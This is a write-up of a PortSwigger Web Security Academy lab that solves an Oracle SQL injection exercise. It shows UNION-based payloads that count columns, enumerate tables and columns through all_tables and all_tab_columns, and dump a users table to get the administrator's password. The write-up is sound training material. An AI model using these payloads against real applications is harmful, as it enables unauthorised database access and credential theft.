---
title: 'Lab: SQL injection attack, listing the database contents on Oracle'
tags: [Portswigger Web Security Academy, Web]

category: "Security｜Practice｜Portswigger Web Security Academy｜SQL"
date: 2023-04-25
---

# Lab: SQL injection attack, listing the database contents on Oracle
<!-- more -->
###### tags: `Portswigger Web Security Academy` `Web`
* Description:  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. 
* Goal:  To solve the lab, log in as the administrator user.
* Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`

## Exp
1. Determine # of columns
Payload: `?category=Lifestyle' union select NULL,NULL from dual--`

2. Determine which column contained text string
Payload: `?category=Lifestyle' union select 'a','b'from dual--`

3. According to [cheat sheet](https://portswigger.net/web-security/sql-injection/examining-the-database)
We can use `all_tables` to search `table_name`
For instance: `SELECT * FROM all_tables`
Payload: `?category=Lifestyle' union select table_name,NULL from all_tables--`
    :::spoiler Result
    ![](https://i.imgur.com/Qbp5dqq.png)
    :::
4. Then tried the specific one - `USERS_LXJEEY`
Payload: `?category=Gifts' union SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LXJEEY'--
`
    :::spoiler Result
    ![](https://i.imgur.com/M1ZoLph.png)
    :::
5. Tried dig deeper
Payload: `?category=Gifts' union SELECT USERNAME_YRYUYR,PASSWORD_OUTVCI FROM USERS_LXJEEY--
`
    :::spoiler Result
    ![](https://i.imgur.com/sbtaeGi.png)
    :::
Finally, we know the password of `administrator` is `z0mtqaim65dnb4yo034l`
:::spoiler Success Screenshot
![](https://i.imgur.com/cEOjCoq.png)
:::

## Reference